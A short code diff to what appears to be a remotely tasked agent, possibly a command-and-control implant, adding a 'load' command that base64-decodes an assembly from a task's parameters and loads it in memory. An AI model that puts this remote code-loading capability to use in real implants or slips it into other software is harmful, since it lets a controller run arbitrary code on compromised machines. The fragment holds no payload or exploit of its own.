@@ -184,6 +184,10 @@ namespace Athena.Commands
                         job.taskresult.Replace("[ERROR]", "");
                     }
                     break;
+                case "load":
+                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
+                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
+                    break;
                 //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
                     LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
